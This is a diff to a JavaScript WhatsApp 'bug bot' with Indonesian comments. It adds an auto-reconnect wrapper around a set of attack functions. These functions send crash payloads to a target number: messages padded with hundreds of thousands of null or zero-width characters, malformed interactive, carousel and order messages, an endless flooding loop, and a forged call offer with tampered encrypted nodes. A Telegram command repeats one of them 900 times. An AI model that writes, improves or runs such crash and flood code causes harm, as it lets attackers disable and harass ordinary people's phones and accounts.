@@ -167,17 +167,77 @@ function generateMessageId() {
   return result;
 }
 
-// Fungsi validasi target JID
-function validateJid(target) {
-  if (!target || typeof target !== 'string') return null;
-  if (target.includes('@s.whatsapp.net') || target.includes('@g.us')) {
-    return target;
-  }
-  const rawNumber = target.replace(/[^0-9]/g, '');
-  if (rawNumber.length > 0) {
-    return `${rawNumber}@s.whatsapp.net`;
+// ================= FITUR ANTI CONNECTION CLOSED ================= //
+
+// Fungsi untuk reconnect dan mendapatkan socket yang valid
+async function getValidSocket(retries = 3) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    if (sessions.size > 0) {
+      for (const [number, sock] of sessions) {
+        try {
+          if (sock && sock.user && sock.ws && sock.ws.readyState === 1) {
+            return sock;
+          }
+        } catch (e) {}
+      }
+    }
+    await sleep(2000);
   }
   return null;
+}
+
+// Fungsi untuk mereconnect semua sesi
+async function reconnectAllSessions() {
+  console.log(chalk.yellow("🔄 Mencoba reconnect semua sesi..."));
+  for (const [number, sock] of sessions) {
+    try {
+      await reconnectWhatsApp(number);
+    } catch (e) {}
+  }
+  await sleep(3000);
+}
+
+// Wrapper untuk semua fungsi bug dengan auto-reconnect
+async function withAutoReconnect(sock, target, func) {
+  let currentSock = sock;
+  let retries = 3;
+  
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try {
+      if (!currentSock || !currentSock.user || (currentSock.ws && currentSock.ws.readyState !== 1)) {
+        console.log("⚠️ Socket tidak valid, mencari socket baru...");
+        currentSock = await getValidSocket();
+        if (!currentSock) {
+          await reconnectAllSessions();
+          currentSock = await getValidSocket();
+        }
+        if (!currentSock) {
+          await sleep(3000);
+          continue;
+        }
+      }
+      
+      await func(currentSock, target);
+      return true;
+      
+    } catch (error) {
+      console.log(`❌ Error attempt ${attempt + 1}/${retries}:`, error.message);
+      
+      if (error.message?.includes('Connection Closed') || 
+          error.output?.statusCode === 428 ||
+          error.message?.includes('closed')) {
+        console.log("🔄 Koneksi terputus, mencoba reconnect...");
+        await reconnectAllSessions();
+        currentSock = await getValidSocket();
+        await sleep(2000);
+      } else {
+        await sleep(1000);
+      }
+    }
+  }
+  
+  console.log("❌ Gagal setelah", retries, "percobaan");
+  return false;
 }
 
 // Middleware untuk cek group only
@@ -474,380 +534,366 @@ async function connectToWhatsApp(botNumber, chatId) {
 // ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //
 
 async function VsxCrashDelay(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  await sock.sendMessage(validTarget, { text: "\u0000".repeat(900000) });
+  await withAutoReconnect(sock, target, async (s, t) => {
+    await s.sendMessage(t, { text: "\u0000".repeat(900000) });
+  });
 }
 
 async function DelayHard(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  await sock.sendMessage(validTarget, { text: "x".repeat(800000) });
+  await withAutoReconnect(sock, target, async (s, t) => {
+    await s.sendMessage(t, { text: "x".repeat(800000) });
+  });
 }
 
 async function StickerFC(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  await sock.sendMessage(validTarget, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
+  await withAutoReconnect(sock, target, async (s, t) => {
+    await s.sendMessage(t, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
+  });
 }
 
 async function Freeze(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  await sock.relayMessage(validTarget, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "FREEZE", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "cta_FREEZE",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
-            version: 3
+  await withAutoReconnect(sock, target, async (s, t) => {
+    await s.relayMessage(t, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: { text: "FREEZE", format: "DEFAULT" },
+            nativeFlowResponseMessage: {
+              name: "cta_FREEZE",
+              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
+              version: 3
+            }
           }
         }
       }
-    }
-  }, { participant: { jid: validTarget } });
+    }, { participant: { jid: t } });
+  });
 }
 
 async function invisfcmsg(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  await sock.sendMessage(validTarget, { text: "\u200b".repeat(800000) });
+  await withAutoReconnect(sock, target, async (s, t) => {
+    await s.sendMessage(t, { text: "\u200b".repeat(800000) });
+  });
 }
 
 async function VnXDelayXFcNew(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  await sock.relayMessage(validTarget, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "VnX", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "cta_VnX",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
-            version: 3,
-            contextInfo: {
-              isForwarded: true,
-              forwardingScore: 999,
-              quotedMessage: {
-                stickerMessage: {
-                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                  mimetype: "image/webp",
-                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                  fileLength: "10610",
-                  mediaKeyTimestamp: "1775044724",
-                  stickerSentTs: "1775044724091"
+  await withAutoReconnect(sock, target, async (s, t) => {
+    await s.relayMessage(t, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: { text: "VnX", format: "DEFAULT" },
+            nativeFlowResponseMessage: {
+              name: "cta_VnX",
+              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
+              version: 3,
+              contextInfo: {
+                isForwarded: true,
+                forwardingScore: 999,
+                quotedMessage: {
+                  stickerMessage: {
+                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                    mimetype: "image/webp",
+                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                    fileLength: "10610",
+                    mediaKeyTimestamp: "1775044724",
+                    stickerSentTs: "1775044724091"
+                  }
                 }
               }
             }
           }
         }
       }
-    }
-  }, { participant: { jid: validTarget } });
+    }, { participant: { jid: t } });
+  });
 }
 
 async function delaynewinvisibleVnX(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  
-  while (true) {
-    try {
-      const MsgNew = {
-        groupStatusMessageV2: {
-          message: {
-            interactiveResponseMessage: {                     
-              body: {
-                text: "VnXNgelay",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: "\u0000".repeat(400000),
-                version: 3
-              },
-              entryPointConversionSource: "call_permission_request"
+  await withAutoReconnect(sock, target, async (s, t) => {
+    while (true) {
+      try {
+        const MsgNew = {
+          groupStatusMessageV2: {
+            message: {
+              interactiveResponseMessage: {                     
+                body: {
+                  text: "VnXNgelay",
+                  format: "DEFAULT"
+                },
+                nativeFlowResponseMessage: {
+                  name: "galaxy_message",
+                  paramsJson: "\u0000".repeat(400000),
+                  version: 3
+                },
+                entryPointConversionSource: "call_permission_request"
+              }
             }
           }
-        }
-      };
+        };
 
-      await sock.relayMessage(validTarget, MsgNew, { participant: { jid: validTarget } });
-      console.log(`✅ VnX Sent to ${validTarget}`);
-      await sleep(1200);
-    } catch (e) {
-      console.log("❌ Error:", e.message);
-      await sleep(5000);
+        await s.relayMessage(t, MsgNew, { participant: { jid: t } });
+        console.log(`✅ VnX Sent to ${t}`);
+        await sleep(1200);
+      } catch (e) {
+        console.log("❌ Error:", e.message);
+        await sleep(5000);
+      }
     }
-  }
+  });
 }
 
 async function VisiNoob(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) return;
-  for (let i = 0; i < 50; i++) {
-    await sock.sendMessage(validTarget, { text: "\u200e".repeat(600000) });
-    await sleep(100);
-  }
+  await withAutoReconnect(sock, target, async (s, t) => {
+    for (let i = 0; i < 50; i++) {
+      await s.sendMessage(t, { text: "\u200e".repeat(600000) });
+      await sleep(100);
+    }
+  });
 }
 
 // ================= FUNGSI ORDER SECRET ================= //
 
 async function OrderSecret(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) {
-    console.log("❌ Target tidak valid:", target);
-    return;
-  }
-  
-  const RuxzSecret = {
-    orderMessage: {
-      orderId: "4U7S4RWPS3C",
-      itemCount: 99999999,
-      status: "CANCELLED",
-      surface: 2,
-      sellerJid: "x",
-      totalAmount1000: 99999999,
-      currencyCodeIso4217: "IDR",
-      orderValue: "Rp",
-      contextInfo: {
-        stanzaId: "3EB0F1A2B3C4D5E6",
-        participant: validTarget,
-        quotedMessage: null,
-        mentionedJid: Array.from({ length: 100 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
+  await withAutoReconnect(sock, target, async (s, t) => {
+    const RuxzSecret = {
+      orderMessage: {
+        orderId: "4U7S4RWPS3C",
+        itemCount: 99999999,
+        status: "CANCELLED",
+        surface: 2,
+        sellerJid: "x",
+        totalAmount1000: 99999999,
+        currencyCodeIso4217: "IDR",
+        orderValue: "Rp",
+        contextInfo: {
+          stanzaId: "3EB0F1A2B3C4D5E6",
+          participant: t,
+          quotedMessage: null,
+          mentionedJid: Array.from({ length: 100 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
+        }
       }
-    }
-  };
+    };
 
-  for (let i = 0; i < 30; i++) {
-    await sock.relayMessage(
-      "status@broadcast",
-      RuxzSecret,
-      {
-        messageId: generateMessageId(),
-        statusJidList: [validTarget],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: {},
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: validTarget },
-                    content: undefined
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    );
-    console.log(`✅ OrderSecret sent to ${validTarget} (${i + 1}/30)`);
-    await sleep(1000);
-  }
+    for (let i = 0; i < 30; i++) {
+      await s.relayMessage(
+        "status@broadcast",
+        RuxzSecret,
+        {
+          messageId: generateMessageId(),
+          statusJidList: [t],
+          additionalNodes: [
+            {
+              tag: "meta",
+              attrs: {},
+              content: [
+                {
+                  tag: "mentioned_users",
+                  attrs: {},
+                  content: [
+                    {
+                      tag: "to",
+                      attrs: { jid: t },
+                      content: undefined
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      );
+      console.log(`✅ OrderSecret sent to ${t} (${i + 1}/30)`);
+      await sleep(1000);
+    }
+  });
 }
 
 // ================= FUNGSI FC NEW ================= //
 
 async function FcNeww(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) {
-    console.log("❌ Target tidak valid:", target);
-    return;
-  }
-  
-  const myJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';
-  if (!myJid || validTarget === myJid) return;
+  await withAutoReconnect(sock, target, async (s, t) => {
+    const myJid = s.user?.id?.split(':')[0] + '@s.whatsapp.net';
+    if (!myJid || t === myJid) return;
 
-  const fcMessage = {
-    viewOnceMessage: {
-      message: {
-        carouselMessage: {
-          cards: [
-            {
-              header: {
-                title: '\u0000.VnX'.repeat(500),
-                hasMediaAttachment: true,
-                stickerMessage: {
-                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                  mimetype: "image/webp",
-                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                  fileLength: "10610",
-                  mediaKeyTimestamp: "1775044724",
-                  stickerSentTs: "1775044724091"
+    const fcMessage = {
+      viewOnceMessage: {
+        message: {
+          carouselMessage: {
+            cards: [
+              {
+                header: {
+                  title: '\u0000.VnX'.repeat(500),
+                  hasMediaAttachment: true,
+                  stickerMessage: {
+                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                    mimetype: "image/webp",
+                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                    fileLength: "10610",
+                    mediaKeyTimestamp: "1775044724",
+                    stickerSentTs: "1775044724091"
+                  }
                 }
               }
-            }
-          ]
+            ]
+          }
         }
       }
-    }
-  };
+    };
 
-  await sock.relayMessage(validTarget, fcMessage, {
-    participant: { jid: validTarget }
+    await s.relayMessage(t, fcMessage, {
+      participant: { jid: t }
+    });
+
+    console.log(`✅ FcNeww sent to ${t}`);
   });
-
-  console.log(`✅ FcNeww sent to ${validTarget}`);
 }
 
 // ================= FUNGSI FC CALL INVIS NEW ================= //
 
 async function FcCallInvisnew(sock, target) {
-  const validTarget = validateJid(target);
-  if (!validTarget) {
-    console.log("❌ Target tidak valid:", target);
-    return;
-  }
-  
-  const {
-    encodeSignedDeviceIdentity,
-    jidDecode,
-    encodeWAMessage,
-  } = require("@denzz221/baileys");
-  
-  let devices = (
-    await sock.getUSyncDevices([validTarget], false, false)
-  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+  await withAutoReconnect(sock, target, async (s, t) => {
+    const {
+      encodeSignedDeviceIdentity,
+      jidDecode,
+      encodeWAMessage,
+    } = require("@denzz221/baileys");
+    
+    let devices = (
+      await s.getUSyncDevices([t], false, false)
+    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
 
-  await sock.assertSessions(devices);
+    await s.assertSessions(devices);
 
-  let privt = () => {
-    let map = {};
-    return {
-      mutex(key, fn) {
-        map[key] ??= { task: Promise.resolve() };
-        map[key].task = (async prev => {
-          try { await prev; } catch {}
-          return fn();
-        })(map[key].task);
-        return map[key].task;
-      }
+    let privt = () => {
+      let map = {};
+      return {
+        mutex(key, fn) {
+          map[key] ??= { task: Promise.resolve() };
+          map[key].task = (async prev => {
+            try { await prev; } catch {}
+            return fn();
+          })(map[key].task);
+          return map[key].task;
+        }
+      };
     };
-  };
 
-  let vion = privt();
-  let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-  let vionoc = sock.encodeWAMessage?.bind(sock);
+    let vion = privt();
+    let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
+    let vionoc = s.encodeWAMessage?.bind(s);
 
-  const originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock);
-  
-  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
+    const originalCreateParticipantNodes = s.createParticipantNodes.bind(s);
+    
+    s.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
+      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
 
-    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-    let memeg = Array.isArray(patched)
-      ? patched
-      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
+      let patched = await (s.patchMessageBeforeSending?.(message, recipientJids) ?? message);
+      let memeg = Array.isArray(patched)
+        ? patched
+        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
 
-    let { id: meId, lid: meLid } = sock.authState.creds.me;
-    let omak = meLid ? jidDecode(meLid)?.user : null;
-    let shouldIncludeDeviceIdentity = false;
+      let { id: meId, lid: meLid } = s.authState.creds.me;
+      let omak = meLid ? jidDecode(meLid)?.user : null;
+      let shouldIncludeDeviceIdentity = false;
 
-    let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
-      let { user: targetUser } = jidDecode(jid);
-      let { user: ownPnUser } = jidDecode(meId);
-      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
-      let y = jid === meId || jid === meLid;
-      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
+      let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
+        let { user: targetUser } = jidDecode(jid);
+        let { user: ownPnUser } = jidDecode(meId);
+        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
+        let y = jid === meId || jid === meLid;
+        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
 
-      let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));
+        let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));
 
-      return vion.mutex(jid, async () => {
-        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
-        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
-        return {
-          tag: 'to',
-          attrs: { jid },
-          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
-        };
-      });
-    }));
+        return vion.mutex(jid, async () => {
+          let { type, ciphertext } = await s.signalRepository.encryptMessage({ jid, data: bytes });
+          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
+          return {
+            tag: 'to',
+            attrs: { jid },
+            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
+          };
+        });
+      }));
 
-    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-  };
+      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
+    };
 
-  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
+    let { nodes: destinations, shouldIncludeDeviceIdentity } = await s.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
 
-  let vionlast = {
-    tag: "call",
-    attrs: { to: validTarget, id: sock.generateMessageTag(), from: sock.user.id },
-    content: [{
-      tag: "offer",
-      attrs: {
-        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-        "call-creator": sock.user.id
-      },
-      content: [
-        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-        {
-          tag: "video",
-          attrs: {
-            orientation: "0",
-            screen_width: "1920",
-            screen_height: "1080",
-            device_orientation: "0",
-            enc: "vp8",
-            dec: "vp8"
-          }
+    let vionlast = {
+      tag: "call",
+      attrs: { to: t, id: s.generateMessageTag(), from: s.user.id },
+      content: [{
+        tag: "offer",
+        attrs: {
+          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
+          "call-creator": s.user.id
         },
-        { tag: "net", attrs: { medium: "3" } },
-        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
-        { tag: "encopt", attrs: { keygen: "2" } },
-        { tag: "destination", attrs: {}, content: destinations },
-        ...(shouldIncludeDeviceIdentity ? [{
-          tag: "device-identity",
-          attrs: {},
-          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
-        }] : [])
-      ]
-    }]
-  };
-  await sock.sendNode(vionlast);
+        content: [
+          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+          {
+            tag: "video",
+            attrs: {
+              orientation: "0",
+              screen_width: "1920",
+              screen_height: "1080",
+              device_orientation: "0",
+              enc: "vp8",
+              dec: "vp8"
+            }
+          },
+          { tag: "net", attrs: { medium: "3" } },
+          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
+          { tag: "encopt", attrs: { keygen: "2" } },
+          { tag: "destination", attrs: {}, content: destinations },
+          ...(shouldIncludeDeviceIdentity ? [{
+            tag: "device-identity",
+            attrs: {},
+            content: encodeSignedDeviceIdentity(s.authState.creds.account, true)
+          }] : [])
+        ]
+      }]
+    };
+    await s.sendNode(vionlast);
 
-  const msg2 = {
-    groupStatusMessageV2: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-          mimetype: "image/webp",
-          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-          fileLength: "10610",
-          mediaKeyTimestamp: "1775044724",
-          stickerSentTs: "1775044724091"
+    const msg2 = {
+      groupStatusMessageV2: {
+        message: {
+          stickerMessage: {
+            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+            mimetype: "image/webp",
+            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+            fileLength: "10610",
+            mediaKeyTimestamp: "1775044724",
+            stickerSentTs: "1775044724091"
+          }
         }
       }
-    }
-  };
+    };
 
-  await sock.relayMessage(validTarget, msg2, {
-    participant: { jid: validTarget },
-    messageId: null,
-    userJid: validTarget,
-    quoted: null
+    await s.relayMessage(t, msg2, {
+      participant: { jid: t },
+      messageId: null,
+      userJid: t,
+      quoted: null
+    });
+    
+    s.createParticipantNodes = originalCreateParticipantNodes;
+    
+    console.log(`✅ FcCallInvisnew sent to ${t}`);
   });
-  
-  // Restore original function
-  sock.createParticipantNodes = originalCreateParticipantNodes;
-  
-  console.log(`✅ FcCallInvisnew sent to ${validTarget}`);
 }
 
 // ================= HELPER FUNCTIONS ================= //
@@ -1851,7 +1897,7 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    for (let i = 0; i < 400; i++) {
+    for (let i = 0; i < 900; i++) {
       await FcCallInvisnew(sock, target);
       await sleep(2000);
       console.log(chalk.green(`✅ Success Sending FcCallInvisnew to ${target}`));
